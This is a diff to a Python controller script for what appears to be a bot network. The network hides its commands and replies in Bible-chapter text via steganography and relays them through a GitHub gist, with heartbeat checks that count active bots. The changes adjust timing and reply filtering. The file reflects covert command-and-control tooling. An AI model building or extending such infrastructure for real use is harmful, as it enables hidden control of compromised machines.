@@ -4,15 +4,17 @@ from datetime import datetime
 from pytimedinput import timedInput
 from time import sleep
 
+from bot.main import BOT_SLEEP_TIME
+
 sys.path.append('..')
-from common.utils import add_message, check_chat_file, get_replies_to_msg_id, read_attachment, reset_gist
+from common.utils import add_message, get_replies_to_msg_id, read_attachment, reset_gist
 from common.utils import CONTROLLER_NICK_NAME
 from common.gist import init_gist
 from common.chapters import get_chapter_for_path_encoding, get_chapter_for_command, read_chapter
 from common.steganography import encode_to_text, decode_from_text
 
 
-HEARTBEAT_TIME = 20
+HEARTBEAT_TIME = 30
 
 
 def encode_path(pth):
@@ -27,13 +29,13 @@ def check_heartbeat():
     msg_id = add_message('Tell me latest Bible news...', CONTROLLER_NICK_NAME)
     now = datetime.now()
 
-    print('Waiting for replies (20 seconds)...', flush=True)
-    for i in range(20):
+    print(f'Waiting for replies ({BOT_SLEEP_TIME + 5} seconds)...', flush=True)
+    for i in range(BOT_SLEEP_TIME + 5):
         print('.', end='', flush=True)
         sleep(1)
     print('.', flush=True)
 
-    replies = get_replies_to_msg_id(msg_id)
+    replies = get_replies_to_msg_id(msg_id, CONTROLLER_NICK_NAME)
     bot_names = list(map(lambda x: x[0], replies))
     bot_names_str = f' ({", ".join(bot_names)})' if len(bot_names) > 0 else ''
     print(f'Active bots ({now}): {len(bot_names)}{bot_names_str}', flush=True)
@@ -64,7 +66,7 @@ def process_cmd(cmd):
     elif len(cmd_parts) == 2 and cmd_parts[0] == 'decode' and cmd_parts[1].isdigit():
         msg_id = int(cmd_parts[1])
         print(f'Decoding replies for message {msg_id}...')
-        replies = get_replies_to_msg_id(msg_id)
+        replies = get_replies_to_msg_id(msg_id, CONTROLLER_NICK_NAME)
         if len(replies) == 0:
             print(f'No reply for message {msg_id} found', flush=True)
         else:
@@ -85,7 +87,6 @@ def process_cmd(cmd):
 def run():
     print('Controller is starting...')
     init_gist()
-    check_chat_file()
     print(f'Controller is running as {CONTROLLER_NICK_NAME}...')
 
     while True:
